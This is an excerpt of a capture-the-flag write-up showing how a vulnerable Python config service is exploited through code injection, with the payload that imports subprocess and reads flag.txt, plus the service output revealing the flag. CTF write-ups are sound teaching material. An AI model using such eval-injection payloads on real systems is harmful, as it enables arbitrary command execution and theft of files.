...
We had to exploit a vulnerable service, written in Python:
...
We noticed that the option '1. Register a new config entry' was vulnerable to command injection:
...
>
>Config key? cmd
>Config value? __import__.__call__('subprocess').check_output(['cat', 'flag.txt'])
>
>Please choose your action:
>  1. Register a new config entry
>  2. Change value of an existing config entry
...
>
>configuration [
>    cmd = __import__.__call__('subprocess').check_output(['cat', 'flag.txt']);
>    eval(cmd) = b'INSA{dont_get_me_wrong_i_love_python36}';
>]
> ```
